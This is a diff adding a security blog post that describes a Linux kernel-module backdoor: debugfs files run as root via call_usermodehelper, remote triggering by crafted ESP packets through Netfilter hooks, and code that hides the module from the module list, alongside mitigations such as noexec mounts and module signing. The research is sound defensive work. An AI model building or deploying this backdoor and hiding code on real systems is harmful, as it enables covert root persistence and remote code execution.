@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en-us">
+	<head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="Nick Bulischeck">
+<meta name="description" content="Yet Another Cybersecurity Blog">
+<meta name="generator" content="Hugo 0.60.1" />
+<title>Misusing debugfs for In-Memory Code Execution</title>
+<link rel="shortcut icon" href="https://nbulischeck.io/images/favicon.ico">
+<link rel="stylesheet" href="https://nbulischeck.io/css/style.css">
+<link rel="stylesheet" href="https://nbulischeck.io/css/highlight.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css" integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
+
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
+
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+        onload="renderMathInElement(document.body);"></script>
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+
+
+
+<link href="https://nbulischeck.io/index.xml" rel="alternate" type="application/rss+xml" title="Nick&#39;s Blog" />
+
+
+<meta property="og:title" content="Misusing debugfs for In-Memory Code Execution" />
+<meta property="og:description" content="An explanation of how debugfs and nf hooks can be used to remotely execute code" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nbulischeck.io/posts/misusing-debugfs-for-in-memory-rce/" />
+<meta property="article:published_time" content="2018-05-22T12:00:00+03:00" />
+<meta property="article:modified_time" content="2018-05-22T12:00:00+03:00" />
+
+
+<meta itemprop="name" content="Misusing debugfs for In-Memory Code Execution">
+<meta itemprop="description" content="An explanation of how debugfs and nf hooks can be used to remotely execute code">
+<meta itemprop="datePublished" content="2018-05-22T12:00:00&#43;03:00" />
+<meta itemprop="dateModified" content="2018-05-22T12:00:00&#43;03:00" />
+<meta itemprop="wordCount" content="2107">
+
+
+
+<meta itemprop="keywords" content="linux,kernel,c," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Misusing debugfs for In-Memory Code Execution"/>
+<meta name="twitter:description" content="An explanation of how debugfs and nf hooks can be used to remotely execute code"/>
+<meta name="twitter:site" content="@https://www.twitter.com/nbulischeck"/>
+
+
+    </head>
+<body>
+    <nav class="main-nav">
+	
+		<a href='https://nbulischeck.io/'>Home</a>
+	
+
+	
+ 		<a href='/about/'>About</a>
+  	
+
+    <a href='https://nbulischeck.io//tags'>Tags</a>
+
+	
+		<a href="https://nbulischeck.io/index.xml">RSS</a>
+	
+</nav>
+
+    <section id="wrapper">
+        
+        
+<article class="post">
+    <header>
+        <h1>Misusing debugfs for In-Memory Code Execution</h1>
+        <h2 class="subtitle">An explanation of how debugfs and nf hooks can be used to remotely execute code</h2>
+        <h2 class="headline">
+        May 22, 2018
+        <br>
+          
+            
+              
+              <a href="https://nbulischeck.io/tags/linux">linux</a>
+            
+               | 
+              <a href="https://nbulischeck.io/tags/kernel">kernel</a>
+            
+               | 
+              <a href="https://nbulischeck.io/tags/c">c</a>
+            
+          
+        </h2>
+    </header>
+    <section id="post-body">
+        <h1 id="introduction">Introduction</h1>
+<p><a href="https://www.kernel.org/doc/Documentation/filesystems/debugfs.txt">Debugfs is a simple-to-use RAM-based file system specially designed for kernel debugging purposes</a>. It was released with version 2.6.10-rc3 and written by Greg Kroah-Hartman. In this post, I will be showing you how to use debugfs and Netfilter hooks to create a Loadable Kernel Module capable of executing code remotely entirely in RAM.</p>
+<p>An attacker's ideal process would be to first gain unprivileged access to the target, perform a local privilege escalation to gain root access, insert the kernel module onto the machine as a method of persistence, and then pivot to the next target.</p>
+<blockquote>
+<p><strong>Note</strong>: The following is tested and working on clean images of Ubuntu 12.04 (3.13.0-32), Ubuntu 14.04 (4.4.0-31), Ubuntu 16.04 (4.13.0-36). All development was done on Arch throughout a few of the most recent kernel versions (4.16+).</p>
+</blockquote>
+<h2 id="practicality-of-a-debugfs-rce">Practicality of a debugfs RCE</h2>
+<p>When diving into how practical using debugfs is, I needed to see how prevalent it was across a variety of systems.</p>
+<p>For every Ubuntu release from 6.06 to 18.04 and CentOS versions 6 and 7, I created a VM and checked the three statements below. This chart details the answers to each of the questions for each distro. The main thing I was looking for was to see if it was even possible to mount the device in the first place. If that was not possible, then we won't be able to use debugfs in our backdoor.</p>
+<p>Fortunately, every distro, except Ubuntu 6.06, was able to mount debugfs. Every Ubuntu version from 10.04 and on as well as CentOS 7 had it mounted by default.</p>
+<ol>
+<li>Present: Is /sys/kernel/debug/ present on first load?</li>
+<li>Mounted: Is /sys/kernel/debug/ mounted on first load?</li>
+<li>Possible: Can debugfs be mounted with <code>sudo mount -t debugfs none /sys/kernel/debug</code>?</li>
+</ol>
+<div style="overflow-x: auto;">
+    <table>
+<thead>
+<tr>
+<th align="left">Operating System</th>
+<th align="center">Present</th>
+<th align="center">Mounted</th>
+<th align="center">Possible</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">Ubuntu 6.06</td>
+<td align="center">No</td>
+<td align="center">No</td>
+<td align="center">No</td>
+</tr>
+<tr>
+<td align="left">Ubuntu 8.04</td>
+<td align="center">Yes</td>
+<td align="center">No</td>
+<td align="center">Yes</td>
+</tr>
+<tr>
+<td align="left">Ubuntu 10.04*</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+</tr>
+<tr>
+<td align="left">Ubuntu 12.04</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+</tr>
+<tr>
+<td align="left">Ubuntu 14.04**</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+</tr>
+<tr>
+<td align="left">Ubuntu 16.04</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+</tr>
+<tr>
+<td align="left">Ubuntu 18.04</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+</tr>
+<tr>
+<td align="left">Centos 6.9</td>
+<td align="center">Yes</td>
+<td align="center">No</td>
+<td align="center">Yes</td>
+</tr>
+<tr>
+<td align="left">Centos 7</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+<td align="center">Yes</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<ul>
+<li>*debugfs also mounted on the server version as rw,relatime on /var/lib/ureadahead/debugfs</li>
+<li>**tracefs also mounted on the server version as rw,relatime on /var/lib/ureadahead/debugfs/tracing</li>
+</ul>
+<h2 id="executing-code-on-debugfs">Executing code on debugfs</h2>
+<p>Once I determined that debugfs is prevalent, I wrote a <a href="https://gist.github.com/nbulischeck/37a86f4db9157372c016abf2235b424d">simple proof of concept</a> to see if you can execute files from it. It is a filesystem after all.</p>
+<p>The debugfs API is actually extremely simple. The main functions you would want to use are: <code>debugfs_initialized</code> - check if debugfs is registered, <code>debugfs_create_blob</code> - create a file for a binary object of arbitrary size, and <code>debugfs_remove</code> - delete the debugfs file.</p>
+<p>In the proof of concept, I didn't use <code>debugfs_initialized</code> because I know that it's present, but it is a good sanity-check.</p>
+<p>To create the file, I used <code>debugfs_create_blob</code> as opposed to <code>debugfs_create_file</code> as my initial goal was to execute ELF binaries. Unfortunately I wasn't able to get that to work - more on that later. All you have to do to create a file is assign the blob pointer to a buffer that holds your content and give it a length. It's easier to think of this as an abstraction to writing your own file operations like you would do if you were designing a character device.</p>
+<p>The following code should be very self-explanatory. <code>dfs</code> holds the file entry and <code>myblob</code> holds the file contents (pointer to the buffer holding the program and buffer length). I simply call the <code>debugfs_create_blob</code> function after the setup with the name of the file, the mode of the file (permissions), <code>NULL</code> parent, and lastly the data.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">struct</span> dentry <span style="color:#f92672">*</span>dfs <span style="color:#f92672">=</span> NULL;
+<span style="color:#66d9ef">struct</span> debugfs_blob_wrapper <span style="color:#f92672">*</span>myblob <span style="color:#f92672">=</span> NULL;
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">create_file</span>(<span style="color:#66d9ef">void</span>){
+	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">\
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">#!/usr/bin/env python</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">with open(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/tmp/i_am_groot</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">, </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">w+</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">) as f:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">\
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">	f.write(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Hello, world!</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)</span><span style="color:#e6db74">&#34;</span>;
+
+	myblob <span style="color:#f92672">=</span> kmalloc(<span style="color:#66d9ef">sizeof</span> <span style="color:#f92672">*</span>myblob, GFP_KERNEL);
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>myblob){
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
+	}
+
+	myblob<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>data <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) buffer;
+	myblob<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>size <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) strlen(buffer);
+
+	dfs <span style="color:#f92672">=</span> debugfs_create_blob(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">debug_exec</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0777</span>, NULL, myblob);
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>dfs){
+		kfree(myblob);
+		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
+	}
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Deleting a file in debugfs is as simple as it can get. One call to <code>debugfs_remove</code> and the file is gone. Wrapping an error check around it just to be sure and it's 3 lines.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">destroy_file</span>(<span style="color:#66d9ef">void</span>){
+	<span style="color:#66d9ef">if</span> (dfs){
+		debugfs_remove(dfs);
+	}
+}
+</code></pre></div><p>Finally, we get to actually executing the file we created. The standard and as far as I know only way to execute files from kernel-space to user-space is through a function called <code>call_usermodehelper</code>. M. Tim Jones wrote an excellent article on using UMH called <a href="https://www.ibm.com/developerworks/library/l-user-space-apps/index.html">Invoking user-space applications from the kernel</a>, so if you want to learn more about it, I highly recommend reading that article.</p>
+<p>To use <code>call_usermodehelper</code> we set up our <code>argv</code> and <code>envp</code> arrays and then call the function. The last flag determines how the kernel should continue after executing the function (&ldquo;Should I wait or should I move on?&quot;). For the unfamiliar, the <code>envp</code> array holds the environment variables of a process. The file we created above and now want to execute is <code>/sys/kernel/debug/debug_exec</code>. We can do this with the code below.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">execute_file</span>(<span style="color:#66d9ef">void</span>){
+	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>envp[] <span style="color:#f92672">=</span> {
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SHELL=/bin/bash</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PATH=/usr/local/sbin:/usr/local/bin:</span><span style="color:#e6db74">&#34;</span>\
+			<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/sbin:/usr/bin:/sbin:/bin</span><span style="color:#e6db74">&#34;</span>,
+		NULL
+	};
+
+	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span> {
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/sys/kernel/debug/debug_exec</span><span style="color:#e6db74">&#34;</span>,
+		NULL
+	};
+
+	call_usermodehelper(argv[<span style="color:#ae81ff">0</span>], argv, envp, UMH_WAIT_EXEC);
+}
+</code></pre></div><p>I would now recommend you try <a href="https://gist.github.com/nbulischeck/37a86f4db9157372c016abf2235b424d">the PoC code</a> to get a good feel for what is being done in terms of actually executing our program. To check if it worked, run <code>ls /tmp/</code> and see if the file <code>i_am_groot</code> is present.</p>
+<h2 id="netfilter">Netfilter</h2>
+<p>We now know how our program gets executed in memory, but how do we send the code and get the kernel to run it remotely? The answer is by using Netfilter! Netfilter is a framework in the Linux kernel that allows kernel modules to register callback functions called hooks in the kernel's networking stack.</p>
+<p>If all that sounds too complicated, think of a Netfilter hook as a bouncer of a club. The bouncer is only allowed to let club-goers wearing green badges to go through (ACCEPT), but kicks out anyone wearing red badges (DENY/DROP). He also has the option to change anyone's badge color if he chooses. Suppose someone is wearing a red badge, but the bouncer wants to let them in anyway. The bouncer can intercept this person at the door and alter their badge to be green. This is known as packet &ldquo;mangling&rdquo;.</p>
+<p>For our case, we don't need to mangle any packets, but for the reader this may be useful. With this concept, we are allowed to check any packets that are coming through to see if they qualify for our criteria. We call the packets that qualify &ldquo;trigger packets&rdquo; because they trigger some action in our code to occur.</p>
+<p>Netfilter hooks are great because you don't need to expose any ports on the host to get the information. If you want a more in-depth look at Netfilter you can <a href="https://www.landhb.me/posts/bODdK/port-knocking-with-netfilter-kernel-modules/">read the article here</a> or the <a href="https://www.netfilter.org/documentation/HOWTO/netfilter-hacking-HOWTO-3.html">Netfilter documentation</a>.</p>
+<p><img src="/images/debugfs/netfilter-hooks.png" alt="Netfilter Routing"></p>
+<p>When I use Netfilter, I will be intercepting packets in the earliest stage, pre-routing.</p>
+<h3 id="esp-packets">ESP Packets</h3>
+<p>The packet I chose to use for this is called ESP. <a href="https://tools.ietf.org/html/rfc4303">ESP or Encapsulating Security Payload Packets</a> were designed to provide a mix of security services to IPv4 and IPv6. It's a fairly standard part of IPSec and the data it transmits is supposed to be encrypted. This means you can put an encrypted version of your script on the client and then send it to the server to decrypt and run.</p>
+<h3 id="netfilter-code">Netfilter Code</h3>
+<p>Netfilter hooks are extremely easy to implement. The prototype for the hook is as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">function_name</span> (
+		<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> hooknum,
+		<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb,
+		<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> net_device <span style="color:#f92672">*</span>in,
+		<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> net_device <span style="color:#f92672">*</span>out,
+		<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>okfn)(<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>)
+);
+</code></pre></div><p>All those arguments aren't terribly important, so let's move on to the one you need: <code>struct sk_buff *skb</code>. <code>sk_buff</code>s get a little complicated so if you want to read more on them, you can find more information <a href="https://wiki.linuxfoundation.org/networking/sk_buff">here</a>.</p>
+<p>To get the IP header of the packet, use the function <code>skb_network_header</code> and typecast it to a <code>struct iphdr *</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">struct</span> iphdr <span style="color:#f92672">*</span>ip_header;
+
+ip_header <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> iphdr <span style="color:#f92672">*</span>)skb_network_header(skb);
+<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ip_header){
+	<span style="color:#66d9ef">return</span> NF_ACCEPT;
+}
+</code></pre></div><p>Next we need to check if the protocol of the packet we received is an ESP packet or not. This can be done extremely easily now that we have the header.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">if</span> (ip_header<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>protocol <span style="color:#f92672">=</span><span style="color:#f92672">=</span> IPPROTO_ESP){
+	<span style="color:#75715e">// Packet is an ESP packet
+</span><span style="color:#75715e"></span>}
+</code></pre></div><p>ESP Packets contain two important values in their header. The two values are SPI and SEQ. SPI stands for Security Parameters Index and SEQ stands for Sequence. Both are technically arbitrary initially, but it is expected that the sequence number be incremented each packet. We can use these values to define which packets are our trigger packets. If a packet matches the correct SPI and SEQ values, we will perform our action.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">if</span> ((esp_header<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>spi <span style="color:#f92672">=</span><span style="color:#f92672">=</span> TARGET_SPI) <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span>
+	(esp_header<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>seq_no <span style="color:#f92672">=</span><span style="color:#f92672">=</span> TARGET_SEQ)){
+	<span style="color:#75715e">// Trigger packet arrived
+</span><span style="color:#75715e"></span>}
+</code></pre></div><p>Once you've identified the target packet, you can extract the ESP data using the struct's member <code>enc_data</code>. Ideally, this would be encrypted thus ensuring the privacy of the code you're running on the target computer, but for the sake of simplicity in the PoC I left it out.</p>
+<p>The tricky part is that Netfilter hooks are run in a softirq context which makes them very fast, but a little delicate. Being in a softirq context allows Netfilter to process incoming packets across multiple CPUs concurrently. They cannot go to sleep and deferred work runs in an interrupt context (this is very bad for us and it requires using <a href="https://github.com/nbulischeck/debugfs-backdoor/blob/master/backdoor/state.c">delayed workqueues as seen in state.c</a>).</p>
+<p>The full code for this section can be found <a href="https://github.com/nbulischeck/debugfs-backdoor/blob/master/backdoor/nfhook.c">here</a>.</p>
+<h2 id="limitations">Limitations</h2>
+<ol>
+<li>Debugfs must be present in the kernel version of the target (&gt;= 2.6.10-rc3).</li>
+<li>Debugfs must be mounted (this is trivial to fix if it is not).</li>
+<li>rculist.h must be present in the kernel (&gt;= linux-2.6.27.62).</li>
+<li>Only interpreted scripts may be run.</li>
+</ol>
+<p>Anything that contains an interpreter directive (python, ruby, perl, etc.) works together when calling <code>call_usermodehelper</code> on it. See <a href="https://en.wikipedia.org/wiki/Shebang_(Unix)">this wikipedia article</a> for more information on the interpreter directive.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">execute_file</span>(<span style="color:#66d9ef">void</span>){
+	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>envp[] <span style="color:#f92672">=</span> {
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SHELL=/bin/bash</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">HOME=/root/</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">USER=root</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PATH=/usr/local/sbin:/usr/local/bin:</span><span style="color:#e6db74">&#34;</span>\
+			<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/sbin:/usr/bin:/sbin:/bin</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DISPLAY=:0</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PWD=/</span><span style="color:#e6db74">&#34;</span>, 
+		NULL
+	};
+
+	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span> {
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/sys/kernel/debug/debug_exec</span><span style="color:#e6db74">&#34;</span>,
+		NULL
+	};
+
+    call_usermodehelper(argv[<span style="color:#ae81ff">0</span>], argv, envp, UMH_WAIT_PROC);
+}
+</code></pre></div><p>Go also works, but it's arguably not entirely in RAM as it has to make a temp file to build it and it also requires the <code>.go</code> file extension making this a little more obvious.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">execute_file</span>(<span style="color:#66d9ef">void</span>){
+	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>envp[] <span style="color:#f92672">=</span> {
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SHELL=/bin/bash</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">HOME=/root/</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">USER=root</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PATH=/usr/local/sbin:/usr/local/bin:</span><span style="color:#e6db74">&#34;</span>\
+			<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/sbin:/usr/bin:/sbin:/bin</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">DISPLAY=:0</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PWD=/</span><span style="color:#e6db74">&#34;</span>, 
+		NULL
+	};
+
+	<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span> {
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/usr/bin/go</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">run</span><span style="color:#e6db74">&#34;</span>,
+		<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/sys/kernel/debug/debug_exec.go</span><span style="color:#e6db74">&#34;</span>,
+		NULL
+	};
+
+    call_usermodehelper(argv[<span style="color:#ae81ff">0</span>], argv, envp, UMH_WAIT_PROC);
+}
+</code></pre></div><h2 id="discovery">Discovery</h2>
+<p>If I were to add the ability to hide a kernel module (which can be done trivially through the following code), discovery would be very difficult. Long-running processes executing through this technique would be obvious as there would be a process with a high pid number, owned by root, and running <code>&lt;interpreter&gt; /sys/kernel/debug/debug_exec</code>. However, if there was no active execution, it leads me to believe that the only method of discovery would be a secondary kernel module that analyzes custom Netfilter hooks.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>module;
+<span style="color:#66d9ef">int</span> module_visible <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">module_unhide</span>(<span style="color:#66d9ef">void</span>){
+	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>module_visible){
+		list_add(<span style="color:#f92672">&amp;</span>(<span style="color:#f92672">&amp;</span>__this_module)<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>list, module);
+		module_visible<span style="color:#f92672">+</span><span style="color:#f92672">+</span>;
+	}
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">module_hide</span>(<span style="color:#66d9ef">void</span>){
+	<span style="color:#66d9ef">if</span> (module_visible){
+		module <span style="color:#f92672">=</span> (<span style="color:#f92672">&amp;</span>__this_module)<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>list.prev;
+		list_del(<span style="color:#f92672">&amp;</span>(<span style="color:#f92672">&amp;</span>__this_module)<span style="color:#f92672">-</span><span style="color:#f92672">&gt;</span>list);
+		module_visible<span style="color:#f92672">-</span><span style="color:#f92672">-</span>;
+	}
+}
+</code></pre></div><h2 id="mitigation">Mitigation</h2>
+<p>The simplest mitigation for this is to remount debugfs as <code>noexec</code> so that execution of files on it is prohibited. To my knowledge, there is no reason to have it mounted the way it is by default. However, this could be trivially bypassed. An example of execution no longer working after remounting with <code>noexec</code> can be found in the screenshot below.</p>
+<p>For kernel modules in general, module signing should be required by default. Module signing involves cryptographically signing kernel modules during installation and then checking the signature upon loading it into the kernel. &ldquo;<a href="https://www.kernel.org/doc/html/v4.16/admin-guide/module-signing.html">This allows increased kernel security by disallowing the loading of unsigned modules or modules signed with an invalid key. Module signing increases security by making it harder to load a malicious module into the kernel.</a>&rdquo;</p>
+<p><img src="/images/debugfs/debugfs-noexec.png" alt="Debugfs with No Execute"></p>
+<pre><code># Mounted without noexec (default)
+cat /etc/mtab | grep &quot;debugfs&quot;
+ls -la /tmp/i_am_groot
+sudo insmod test.ko
+ls -la /tmp/i_am_groot
+sudo rmmod test.ko
+sudo rm /tmp/i_am_groot
+sudo umount /sys/kernel/debug
+</code></pre><pre><code># Mounted with noexec
+sudo mount -t debugfs none -o rw,noexec /sys/kernel/debug
+ls -la /tmp/i_am_groot
+sudo insmod test.ko
+ls -la /tmp/i_am_groot
+sudo rmmod test.ko
+</code></pre><h2 id="future-research">Future Research</h2>
+<p>An obvious area to expand on this would be finding a more standard way to load programs as well as a way to load ELF files. Also, developing a kernel module that can distinctly identify custom Netfilter hooks that were loaded in from kernel modules would be useful in defeating nearly every LKM rootkit that uses Netfilter hooks.</p>
+
+    </section>
+</article>
+
+
+
+
+
+        
+            <footer id="footer">
+    
+        <div id="social">
+
+	
+	
+    <a class="symbol" href="https://www.github.com/nbulischeck">
+        <i class="fa fa-github"></i>
+    </a>
+    
+    <a class="symbol" href="https://www.twitter.com/nbulischeck">
+        <i class="fa fa-twitter"></i>
+    </a>
+    
+
+
+</div>
+
+    
+    <p class="small">
+    
+        © Copyright 2019 Nick Bulischeck
+    
+    </p>
+</footer>
+
+        
+    </section>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://nbulischeck.io/js/main.js"></script>
+<script src="https://nbulischeck.io/js/highlight.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-154144453-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+</body>
+</html>
